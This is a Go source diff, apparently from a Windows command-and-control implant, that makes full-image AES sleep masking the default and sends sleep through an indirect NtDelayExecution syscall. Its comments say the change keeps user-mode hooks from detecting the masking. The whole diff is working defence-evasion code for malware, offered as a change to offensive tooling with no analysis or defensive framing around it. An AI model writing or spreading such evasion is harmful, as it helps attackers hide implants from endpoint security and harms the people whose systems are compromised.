@@ -63,6 +63,15 @@ func InitSleepMask() bool {
 	smState.storeSensitiveData()
 	smState.ready = true
 
+	// Promote the full-image AES sleep mask to default when available (amd64
+	// Windows): it encrypts all committed code/data pages during sleep, which
+	// is far stronger than the 4096-byte config-buffer mask.
+	if advancedMaskFactory != nil {
+		if m := advancedMaskFactory(); m != nil {
+			activeSleepMask = m
+		}
+	}
+
 	procVirtualProtect.Call(ptr, maskBufferSize, pageNoaccess)
 	return true
 }
@@ -141,12 +150,21 @@ func sleepWithMask(d time.Duration) {
 		return
 	}
 	sleepMaskEncrypt()
-	procSleep.Call(uintptr(d.Milliseconds()))
+	if sleepObfFunc != nil {
+		sleepObfFunc(uintptr(d.Milliseconds()))
+	} else {
+		procSleep.Call(uintptr(d.Milliseconds()))
+	}
 	sleepMaskDecrypt()
 }
 
 func init() {
+	// Route sleep through an indirect NtDelayExecution syscall so user-mode
+	// hooks on kernel32!Sleep cannot detect/break sleep masking.
 	sleepObfFunc = func(ms uintptr) {
-		procSleep.Call(ms)
+		if !ekkoReady {
+			initEkko()
+		}
+		indirectNtDelayExecution(time.Duration(ms) * time.Millisecond)
 	}
 }
